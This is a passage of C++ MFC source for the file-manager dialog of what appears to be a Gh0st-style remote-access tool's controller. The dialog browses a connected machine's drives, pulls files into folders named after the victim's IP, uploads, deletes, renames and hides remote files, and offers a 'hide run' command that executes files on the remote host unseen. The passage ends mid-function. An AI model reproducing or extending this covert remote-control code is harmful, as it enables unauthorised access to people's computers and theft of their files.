// CFileDlg.cpp: 实现文件
//

#include "pch.h"
#include "nbclass.h"
#include "CFileDlg.h"
#include"InputDlg.h"
#include "afxdialogex.h"
#include"../../common/macros.h"
#include"Sortthelist.h"
enum
{
	WM_UPLOAD = WM_USER + 102,	// 发送上传任务

};

// CFileDlg 对话框

IMPLEMENT_DYNAMIC(CFileDlg, CDialog)


static UINT indicators[] =
{
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,
	ID_SEPARATOR
};

CFileDlg::CFileDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext* pContext)
	: CDialog(IDD_FILEDLG, pParent)
{

	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICO_FILE));

	// 保存远程驱动器列表
	m_bCanAdmin = *m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	m_strDesktopPath = m_pContext->m_DeCompressionBuffer.GetBuffer(2);

	m_strStartupPath = m_pContext->m_DeCompressionBuffer.GetBuffer(2 + strlen(m_strDesktopPath)+1);

	memset(m_bRemoteDriveList, 0, sizeof(m_bRemoteDriveList));

	memcpy(m_bRemoteDriveList, m_pContext->m_DeCompressionBuffer.GetBuffer(1 + 1 + m_strDesktopPath.GetLength() + 1 + m_strStartupPath.GetLength()+1),
		m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1 - 1 - m_strDesktopPath.GetLength() - 1 - m_strStartupPath.GetLength() + 1);
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	m_nOperatingFileLength = 0;
	m_nCounter = 0;
	m_bIsStop = false;


}

CFileDlg::~CFileDlg()
{

}

void CFileDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, m_path);
	DDX_Control(pDX, IDC_LIST1, m_listfile);
}


BEGIN_MESSAGE_MAP(CFileDlg, CDialog)
	ON_WM_SIZE()
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_BUTTON1, &CFileDlg::OnBnClickedButton1)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST1, &CFileDlg::OnNMDblclkList1)
	ON_BN_CLICKED(IDC_BUTTON3, &CFileDlg::OnBnClickedButton3)
	ON_NOTIFY(NM_RCLICK, IDC_LIST1, &CFileDlg::OnNMRClickList1)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_DELETE, &CFileDlg::OnUpdateIdtRemoteDelete)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_COPY, &CFileDlg::OnUpdateIdtRemoteCopy)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_PREV, &CFileDlg::OnUpdateIdtRemotePrev)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_NEWFOLDER, &CFileDlg::OnUpdateIdtRemoteNewfolder)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_STOP, &CFileDlg::OnUpdateIdtRemoteStop)
	ON_COMMAND(IDT_REMOTE_VIEW, &CFileDlg::OnIdtRemoteView)
	ON_COMMAND(ID_RVIEW_32823, &CFileDlg::OnRviewDa)
	ON_COMMAND(ID_RVIEW_32824, &CFileDlg::OnRviewXiao)
	ON_COMMAND(ID_RVIEW_32825, &CFileDlg::OnRviewList)
	ON_COMMAND(ID_RVIEW_32826, &CFileDlg::OnRviewXiang)
	ON_COMMAND(IDT_REMOTE_COPY, &CFileDlg::OnIdtRemoteDown)
	ON_COMMAND(IDT_REMOTE_DELETE, &CFileDlg::OnIdtRemoteDelete)
	ON_COMMAND(IDT_REMOTE_NEWFOLDER, &CFileDlg::OnIdtRemoteNewfolder)
	ON_COMMAND(IDT_REMOTE_PREV, &CFileDlg::OnIdtRemotePrev)
	ON_COMMAND(IDT_REMOTE_STOP, &CFileDlg::OnIdtRemoteStop)
	ON_COMMAND(ID_FILE_32835, &CFileDlg::OnRename)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST1, &CFileDlg::OnLvnEndlabeleditList1)
	ON_COMMAND(IDM_REFRESH, &CFileDlg::OnRefresh)
	ON_COMMAND(ID_32846, &CFileDlg::OnShowRun)
	ON_COMMAND(ID_32847, &CFileDlg::OnHideRun)
//	ON_WM_DROPFILES()
ON_COMMAND(ID_FILE_32842, &CFileDlg::OnFileDown)
//ON_NOTIFY(HDN_BEGINDRAG, 0, &CFileDlg::OnHdnBegindragList1)
ON_WM_DROPFILES()
ON_MESSAGE(WM_UPLOAD, &CFileDlg::OnUpload)
ON_COMMAND(ID_FILE_32876, &CFileDlg::OnFileHide)
ON_NOTIFY(LVN_COLUMNCLICK, IDC_LIST1, &CFileDlg::OnLvnColumnclickList1)
END_MESSAGE_MAP()


// CFileDlg 消息处理程序

int	GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes)
{
	SHFILEINFO	sfi;
	if (dwFileAttributes == INVALID_FILE_ATTRIBUTES)
		dwFileAttributes = FILE_ATTRIBUTE_NORMAL;
	else
		dwFileAttributes |= FILE_ATTRIBUTE_NORMAL;

	SHGetFileInfo
	(
		lpFileName,
		dwFileAttributes,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES
	);

	return sfi.iIcon;
}

bool CFileDlg::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
	LPTSTR p, pszDirCopy;
	DWORD dwAttributes;

	// Make a copy of the string for editing.

	__try
	{
		pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

		if (pszDirCopy == NULL)
			return FALSE;

		lstrcpy(pszDirCopy, pszDirPath);

		p = pszDirCopy;

		//  If the second character in the path is "\", then this is a UNC
		//  path, and we should skip forward until we reach the 2nd \ in the path.

		if ((*p == TEXT('\\')) && (*(p + 1) == TEXT('\\')))
		{
			p++;            // Skip over the first \ in the name.
			p++;            // Skip over the second \ in the name.

			//  Skip until we hit the first "\" (\\Server\).

			while (*p && *p != TEXT('\\'))
			{
				p = CharNext(p);
			}

			// Advance over it.

			if (*p)
			{
				p++;
			}

			//  Skip until we hit the second "\" (\\Server\Share\).

			while (*p && *p != TEXT('\\'))
			{
				p = CharNext(p);
			}

			// Advance over it also.

			if (*p)
			{
				p++;
			}

		}
		else if (*(p + 1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
		{
			p++;
			p++;

			// If it exists, skip over the root specifier

			if (*p && (*p == TEXT('\\')))
			{
				p++;
			}
		}

		while (*p)
		{
			if (*p == TEXT('\\'))
			{
				*p = TEXT('\0');
				dwAttributes = GetFileAttributes(pszDirCopy);

				// Nothing exists with this name.  Try to make the directory name and error if unable to.
				if (dwAttributes == 0xffffffff)
				{
					if (!CreateDirectory(pszDirCopy, NULL))
					{
						if (GetLastError() != ERROR_ALREADY_EXISTS)
						{
							free(pszDirCopy);
							return FALSE;
						}
					}
				}
				else
				{
					if ((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
					{
						// Something exists with this name, but it's not a directory... Error
						free(pszDirCopy);
						return FALSE;
					}
				}

				*p = TEXT('\\');
			}

			p = CharNext(p);
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		// SetLastError(GetExceptionCode());
		free(pszDirCopy);
		return FALSE;
	}

	free(pszDirCopy);
	return TRUE;
}

void CFileDlg::SendStop()
{
	BYTE	bBuff = COMMAND_STOP;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CFileDlg::ShowProgress()
{
	char* lpDirection = NULL;
	if (m_bIsUpload)
		lpDirection = "传送文件";
	else
		lpDirection = "接收文件";

	if ((int)m_nCounter == -1)
	{
		m_nCounter = m_nOperatingFileLength;
	}

	int	progress = (float)(m_nCounter * 100) / m_nOperatingFileLength;
	ShowMessage(_T("%s %s %dKB (%d%%)"), lpDirection, m_strOperatingFile, (int)(m_nCounter / 1024), progress);
	m_ProgressCtrl->SetPos(progress);

	if (m_nCounter == m_nOperatingFileLength)
	{
		m_nCounter = m_nOperatingFileLength = 0;
		// 关闭文件句柄
	}
}

void CFileDlg::SavaRemoteFile()
{
	char path[MAX_PATH] = { 0 };
	// 重置计数器
	m_nCounter = 0;

	//获取要保存的路径
	GetCurrentDirectoryA(MAX_PATH,path);
	CString strDestDirectory = path;
	strDestDirectory.Append("\\Download\\");
	//拼接要保存的路径
	if (!m_hCopyDestFolder.IsEmpty())
	{
		strDestDirectory += m_hCopyDestFolder + "\\";
	}


	FILESIZE* pFileSize = (FILESIZE*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwSizeHigh = pFileSize->dwSizeHigh;
	DWORD	dwSizeLow = pFileSize->dwSizeLow;

	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD)) + dwSizeLow;

	// 当前正操作的文件名
	m_strOperatingFile = m_pContext->m_DeCompressionBuffer.GetBuffer(9);

	m_strReceiveLocalFile = m_strOperatingFile;

	// 得到要保存到的本地的文件路径
	m_strReceiveLocalFile.Replace(m_Remote_Path, strDestDirectory);

	// 创建多层目录
	MakeSureDirectoryPathExists(m_strReceiveLocalFile.GetBuffer(0));

	Save = m_strReceiveLocalFile.GetBuffer(0);

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strReceiveLocalFile.GetBuffer(0), &FindFileData);

	// 文件已经存在
	if (hFind != INVALID_HANDLE_VALUE)
	{
		MessageBoxA("文件已存在，删除后重试");
		SendStop();
		return;
	}

	int nTransferMode = m_nTransferMode;


	//  1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // 文件打开方式 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = COMMAND_CONTINUE;

	// 偏移置0
	memset(bToken + 1, 0, 8);
	// 重新创建
	dwCreationDisposition = CREATE_ALWAYS;

	FindClose(hFind);


	HANDLE	hFile =
		CreateFile
		(
			m_strReceiveLocalFile.GetBuffer(0),
			GENERIC_WRITE,
			FILE_SHARE_WRITE,
			NULL,
			dwCreationDisposition,
			FILE_ATTRIBUTE_NORMAL,
			0
		);
	// 需要错误处理
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nOperatingFileLength = 0;
		m_nCounter = 0;
		::MessageBox(m_hWnd, m_strReceiveLocalFile + " Document creation failed!", "Warning", MB_OK | MB_ICONWARNING);
		return;
	}
	CloseHandle(hFile);

	ShowProgress();
	if (m_bIsStop)
		SendStop();
	else
	{
		// 发送继续传输文件的token,包含文件续传的偏移
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	
}

void CFileDlg::SendTransferMode()
{
	m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
	BYTE bToken[5];
	bToken[0] = COMMAND_SET_TRANSFER_MODE;
	memcpy(bToken + 1, &m_nTransferMode, sizeof(m_nTransferMode));
	m_iocpServer->Send(m_pContext, (unsigned char*)&bToken, sizeof(bToken));
}

/// <summary>
/// 远程发来的文件保存到本地
/// </summary>
void CFileDlg::WriteLocalRecvFile()
{

	// 传输完毕
	BYTE* pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	FILESIZE* pFileSize;
	// 得到数据的偏移
	pData = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);

	pFileSize = (FILESIZE*)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	// 得到数据在文件中的偏移, 赋值给计数器
	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;


	dwBytesToWrite = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;

	HANDLE	hFile =
		CreateFile
		(
			m_strReceiveLocalFile.GetBuffer(0),
			GENERIC_WRITE,
			FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			0
		);

	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

	int nRet = 0;
	int i;
	for (i = 0; i < MAX_WRITE_RETRY; i++)
	{
		// 写入文件
		nRet = WriteFile
		(
			hFile,
			pData,
			dwBytesToWrite,
			&dwBytesWrite,
			NULL
		);
		if (nRet > 0)
		{
			break;
		}
	}
	if (i == MAX_WRITE_RETRY && nRet <= 0)
	{
		::MessageBox(m_hWnd, m_strReceiveLocalFile + " Document creation failed!", "Warning", MB_OK | MB_ICONWARNING);
	}
	CloseHandle(hFile);
	// 为了比较，计数器递增
	m_nCounter += dwBytesWrite;
	ShowProgress();
	if (m_bIsStop)
		SendStop();
	else
	{
		BYTE	bToken[9];
		bToken[0] = COMMAND_CONTINUE;
		dwOffsetLow += dwBytesWrite;
		memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
		memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
}

/// <summary>
/// 接受文件完成
/// </summary>
void CFileDlg::EndLocalRecvFile()
{
	m_nCounter = 0;
	m_strOperatingFile = "";
	m_nOperatingFileLength = 0;

	if (m_Remote_Download_Job.IsEmpty() || m_bIsStop)
	{
		m_Remote_Download_Job.RemoveAll();
		m_bIsStop = false;
		// 重置传输方式
		m_nTransferMode = TRANSFER_MODE_NORMAL;
		EnableControl(TRUE);
		ShowMessage(_T("接受文件完成 %s"), Save);
	}
	else
	{
		// 我靠，不sleep下会出错，服了可能以前的数据还没send出去
		Sleep(100);
		SendDownloadJob();
	}
	return;
}

void CFileDlg::SendException()
{
	BYTE	bBuff = COMMAND_EXCEPTION;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CFileDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
		
	case TOKEN_FILE_LIST: // 文件列表
		FixedRemoteFileList
		(
			m_pContext->m_DeCompressionBuffer.GetBuffer(0),
			m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1
		);
		break;
	case TOKEN_FILE_SIZE:				// 传输文件时的第一个数据包，文件大小，及文件名
		SavaRemoteFile();					//保存传过来的文件
		break;
	case TOKEN_FILE_DATA: // 文件内容
		WriteLocalRecvFile();
		break;
	case TOKEN_TRANSFER_FINISH: // 传输完成
		EndLocalRecvFile();
		break;
	case TOKEN_CREATEFOLDER_FINISH:  
		GetRemoteFileList(".");
		break;		
	case TOKEN_DELETE_FINISH:			//删除完毕
		EndRemoteDeleteFile();
		break;
	case TOKEN_HIDE_FINISH:
		EndRemoteHideFile();			//属性设置完毕
		break;
	case TOKEN_GET_TRANSFER_MODE:   //如果文件存在设置全部覆盖
		SendTransferMode();
		break;
	case TOKEN_DATA_CONTINUE:			//继续发送
		SendFileData();
		break;
	case TOKEN_RENAME_FINISH:
		// 刷新远程文件列表
		GetRemoteFileList(".");
		break;
	case TOKEN_ACCESS_ERROR:
		MessageBoxA("权限不足");
		EnableControl(TRUE);
		break;
	default:
		SendException();
		break;
	}

}
void CFileDlg::EndLocalUploadFile()
{

	m_nCounter = 0;
	m_strOperatingFile = "";
	m_nOperatingFileLength = 0;

	if (m_Remote_Upload_Job.IsEmpty() || m_bIsStop)
	{
		m_Remote_Upload_Job.RemoveAll();
		m_bIsStop = false;
		EnableControl(TRUE);
		GetRemoteFileList(".");
		ShowMessage(_T("远程：装载目录 %s\\*.* 完成"), m_Remote_Path);
	}
	else
	{
		// 我靠，不sleep下会出错，服了可能以前的数据还没send出去
		Sleep(100);
		SendUploadJob();
	}
	return;
}

void CFileDlg::SendFileData()
{
	FILESIZE* pFileSize = (FILESIZE*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

	ShowProgress();


	if (m_nCounter == m_nOperatingFileLength || pFileSize->dwSizeLow == -1 || m_bIsStop)
	{
		EndLocalUploadFile();
		return;
	}


	HANDLE	hFile;
	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}

	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9

	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;
	BYTE* lpBuffer = (BYTE*)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  大小，偏移，数据
	lpBuffer[0] = COMMAND_FILE_DATA;
	memcpy(lpBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(lpBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	// 返回值
	bool	bRet = true;
	ReadFile(hFile, lpBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);


	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
	}
	LocalFree(lpBuffer);
}

BOOL CFileDlg::InitView()
{

	RECT	rect;
	GetClientRect(&rect);

	if (!m_wndToolBar_Remote.Create(this, WS_CHILD |
		WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, ID_REMOTE_TOOLBAR)
		|| !m_wndToolBar_Remote.LoadToolBar(ID_REMOTE_TOOLBAR))
	{
		TRACE0(_T("Failed to create toolbar "));
		return -1; //Failed to create
	}
	m_wndToolBar_Remote.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
	m_wndToolBar_Remote.LoadTrueColorToolBar
	(
		24,    //加载真彩工具条
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_DISABLE
	);
	// 添加下拉按钮
	m_wndToolBar_Remote.AddDropDownButton(this, IDT_REMOTE_VIEW, IDR_REMOTE_VIEW);

	//显示工具栏
	m_wndToolBar_Remote.MoveWindow(305, 0, rect.right - 268, 48);


	// 创建带进度条的状态栏
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
			sizeof(indicators) / sizeof(UINT)))
	{
		TRACE0(_T("Failed to create status bar\n"));
		return -1;      // fail to create
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 50);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏	

	
	m_wndStatusBar.GetItemRect(1, &rect);
	m_ProgressCtrl = new CProgressCtrl;      //进度条
	m_ProgressCtrl->Create(PBS_SMOOTH | WS_VISIBLE, rect, &m_wndStatusBar, 1);
	m_ProgressCtrl->SetRange(0, 100);           //设置进度条范围
	m_ProgressCtrl->SetPos(100);                 //设置进度条当前位置


	FixedRemoteDriveList();
	return TRUE;
}

BOOL CFileDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 文件管理", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	//当要下载文件时已IP为命名的文件夹
	m_hCopyDestFolder = inet_ntoa(sockAddr.sin_addr);
	SetWindowText(str);
	

	return InitView();

}


BOOL CFileDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN)
	{
		if (pMsg->wParam == VK_ESCAPE)
			return true;
		if (pMsg->wParam == VK_RETURN)
		{
				if(pMsg->hwnd == m_listfile.m_hWnd ||
				pMsg->hwnd == m_path.m_hWnd)
			{
				GetRemoteFileList();
			}
			return TRUE;
		}
	}

	if (m_wndToolBar_Remote.IsWindowVisible())
	{
		CWnd* pWndParent = m_wndToolBar_Remote.GetParent();
		m_wndToolBar_Remote.OnUpdateCmdUI((CFrameWnd*)this, TRUE);
	}

	return CDialog::PreTranslateMessage(pMsg);
}


void CFileDlg::OnSize(UINT nType, int cx, int cy)
{

	CDialog::OnSize(nType, cx, cy);


	if (m_wndStatusBar.m_hWnd == NULL)
		return;

	// 定位状态栏
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示工具栏
	RECT	rect;
	m_wndStatusBar.GetItemRect(1, &rect);
	m_ProgressCtrl->MoveWindow(&rect);

	GetDlgItem(IDC_LIST1)->MoveWindow(0, 36, cx, cy - 60);

}


void CFileDlg::OnClose()
{
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	CDialog::OnClose();
}


void CFileDlg::ShowMessage(char* lpFmt, ...)
{
	char buff[1024];
	va_list    arglist;
	va_start(arglist, lpFmt);

	memset(buff, 0, sizeof(buff));

	vsprintf(buff, lpFmt, arglist);
	::SendMessage(m_wndStatusBar, SB_SETTEXT, 0, (LPARAM)buff);
	va_end(arglist);
}

void CFileDlg::FixedRemoteDriveList()
{
	
	// 加载系统统图标列表 设置驱动器图标列表
	HIMAGELIST hImageListLarge = NULL;
	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(&hImageListLarge, &hImageListSmall);
	ListView_SetImageList(m_listfile.m_hWnd, hImageListLarge, LVSIL_NORMAL);
	ListView_SetImageList(m_listfile.m_hWnd, hImageListSmall, LVSIL_SMALL);

	m_listfile.DeleteAllItems();
	// 重建Column
	while (m_listfile.DeleteColumn(0) != 0);
	m_listfile.InsertColumn(0, "名称", LVCFMT_LEFT, 200);
	m_listfile.InsertColumn(1, "类型", LVCFMT_LEFT, 100);
	m_listfile.InsertColumn(2, "总大小", LVCFMT_LEFT, 100);
	m_listfile.InsertColumn(3, "可用空间", LVCFMT_LEFT, 115);


	char* pDrive = NULL;
	pDrive = (char*)m_bRemoteDriveList;

	unsigned long		AmntMB = 0; // 总大小
	unsigned long		FreeMB = 0; // 剩余空间
	char				VolName[MAX_PATH];
	char				FileSystem[MAX_PATH];

	/*
	6	DRIVE_FLOPPY
	7	DRIVE_REMOVABLE
	8	DRIVE_FIXED
	9	DRIVE_REMOTE
	10	DRIVE_REMOTE_DISCONNECT
	11	DRIVE_CDROM
	*/
	int	nIconIndex = -1;
	for (int i = 0; pDrive[i] != '\0';)
	{
		if (pDrive[i] == 'A' || pDrive[i] == 'B')
		{
			nIconIndex = 6;
		}
		else
		{
			switch (pDrive[i + 1])
			{
			case DRIVE_REMOVABLE:
				nIconIndex = 7;
				break;
			case DRIVE_FIXED:
				nIconIndex = 8;
				break;
			case DRIVE_REMOTE:
				nIconIndex = 9;
				break;
			case DRIVE_CDROM:
				nIconIndex = 11;
				break;
			default:
				nIconIndex = 8;
				break;
			}
		}
		CString	str;
		str.Format(_T("%c:\\"), pDrive[i]);
		int	nItem = m_listfile.InsertItem(i, str, nIconIndex);
		m_listfile.SetItemData(nItem, 1);

		memcpy(&AmntMB, pDrive + i + 2, 4);
		memcpy(&FreeMB, pDrive + i + 6, 4);
		str.Format(_T("%10.1f GB"), (float)AmntMB / 1024);
		m_listfile.SetItemText(nItem, 2, str);
		str.Format(_T("%10.1f GB"), (float)FreeMB / 1024);
		m_listfile.SetItemText(nItem, 3, str);

		i += 10;

		char* lpFileSystemName = NULL;
		char* lpTypeName = NULL;

		lpTypeName = pDrive + i;
		i += lstrlen(pDrive + i) + 1;
		lpFileSystemName = pDrive + i;

		// 磁盘类型, 为空就显示磁盘名称
		if (lstrlen(lpFileSystemName) == 0)
		{
			m_listfile.SetItemText(nItem, 1, lpTypeName);
		}
		else
		{
			m_listfile.SetItemText(nItem, 1, lpFileSystemName);
		}


		i += lstrlen(pDrive + i) + 1;
	}
	// 重置远程当前路径
	m_Remote_Path = "";
	m_path.SetWindowTextA("");
	ShowMessage(_T("远程: 装载目录 %s 完成"), m_Remote_Path);
}

CString CFileDlg::GetParentDirectory(CString strPath)
{
	CString	strCurPath = strPath;
	int Index = strCurPath.ReverseFind('\\');
	if (Index == -1)
	{
		return strCurPath;
	}
	CString str = strCurPath.Left(Index);
	Index = str.ReverseFind('\\');
	if (Index == -1)
	{
		strCurPath = "";
		return strCurPath;
	}
	strCurPath = str.Left(Index);

	if (strCurPath.Right(1) != "\\")
		strCurPath += "\\";
	return strCurPath;
}

void CFileDlg::GetRemoteFileList(CString directory)
{
	if (directory.GetLength() == 0)
	{
		int	nItem = m_listfile.GetSelectionMark();

		// 如果有选中的，是目录
		if (nItem != -1)
		{
			if (m_listfile.GetItemData(nItem) == 1)
			{
				directory = m_listfile.GetItemText(nItem, 0);
			}
		}
		// 从编辑框里得到路径
		else
		{
			
			  m_path.GetWindowTextA(m_Remote_Path);
		}
	}

	// 得到父目录
	if (directory == "..")
	{
		m_Remote_Path = GetParentDirectory(m_Remote_Path);
	}
	else if (directory != ".")
	{
		m_Remote_Path += directory;
		if (m_Remote_Path.Right(1) != "\\")
			m_Remote_Path += "\\";
	}

	// 是驱动器的根目录,返回磁盘列表
	if (m_Remote_Path.GetLength() == 0)
	{
		FixedRemoteDriveList();
		return;
	}

	// 发送数据前清空缓冲区

	int	PacketSize = m_Remote_Path.GetLength() + 2;
	BYTE* bPacket = (BYTE*)LocalAlloc(LPTR, PacketSize);

	bPacket[0] = COMMAND_LIST_FILES;
	memcpy(bPacket + 1, m_Remote_Path.GetBuffer(0), PacketSize - 1);
	m_iocpServer->Send(m_pContext, bPacket, PacketSize);
	LocalFree(bPacket);

	m_path.SetWindowTextA(m_Remote_Path) ;

	// 得到返回数据前禁窗口
	m_listfile.EnableWindow(FALSE);
	m_ProgressCtrl->SetPos(0);
}

void CFileDlg::FixedRemoteFileList(BYTE* pbBuffer, DWORD dwBufferLen)
{
	// 重新设置ImageList
	SHFILEINFO	sfi;
	HIMAGELIST hImageListLarge = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_LARGEICON);
	HIMAGELIST hImageListSmall = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
	ListView_SetImageList(m_listfile.m_hWnd, hImageListLarge, LVSIL_NORMAL);
	ListView_SetImageList(m_listfile.m_hWnd, hImageListSmall, LVSIL_SMALL);

	// 重建标题
	m_listfile.DeleteAllItems();
	while (m_listfile.DeleteColumn(0) != 0);
	m_listfile.InsertColumn(0, "名称", LVCFMT_LEFT, 200);
	m_listfile.InsertColumn(1, "大小", LVCFMT_LEFT, 100);
	m_listfile.InsertColumn(2, "类型", LVCFMT_LEFT, 100);
	m_listfile.InsertColumn(3, "修改日期", LVCFMT_LEFT, 115);

	int	nItemIndex = 0;
	m_listfile.SetItemData
	(
		m_listfile.InsertItem(nItemIndex++, "..", GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),
		1
	);
	/*
	ListView 消除闪烁
	更新数据前用SetRedraw(FALSE)
	更新后调用SetRedraw(TRUE)
	*/
	m_listfile.SetRedraw(FALSE);

	if (dwBufferLen != 0)
	{
		// 
		for (int i = 0; i < 2; i++)
		{
			// 跳过Token，共5字节
			char* pList = (char*)(pbBuffer + 1);
			for (char* pBase = pList; pList - pBase < dwBufferLen - 1;)
			{
				char* pszFileName = NULL;
				DWORD	dwFileSizeHigh = 0; // 文件高字节大小
				DWORD	dwFileSizeLow = 0; // 文件低字节大小
				int		nItem = 0;
				bool	bIsInsert = false;
				FILETIME	ftm_strReceiveLocalFileTime;

				int	nType = *pList ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
				// i 为 0 时，列目录，i为1时列文件
				bIsInsert = !(nType == FILE_ATTRIBUTE_DIRECTORY) == i;
				pszFileName = ++pList;

				if (bIsInsert)
				{
					nItem = m_listfile.InsertItem(nItemIndex++, pszFileName, GetIconIndex(pszFileName, nType));
					m_listfile.SetItemData(nItem, nType == FILE_ATTRIBUTE_DIRECTORY);
					SHFILEINFO	sfi;
					SHGetFileInfo(pszFileName, FILE_ATTRIBUTE_NORMAL | nType, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
					m_listfile.SetItemText(nItem, 2, sfi.szTypeName);
				}

				// 得到文件大小
				pList += lstrlen(pszFileName) + 1;
				if (bIsInsert)
				{
					memcpy(&dwFileSizeHigh, pList, 4);
					memcpy(&dwFileSizeLow, pList + 4, 4);
					CString strSize;
					strSize.Format(_T("%10d KB"), (dwFileSizeHigh * (MAXDWORD)) / 1024 + dwFileSizeLow / 1024 + (dwFileSizeLow % 1024 ? 1 : 0));
					m_listfile.SetItemText(nItem, 1, strSize);
					memcpy(&ftm_strReceiveLocalFileTime, pList + 8, sizeof(FILETIME));
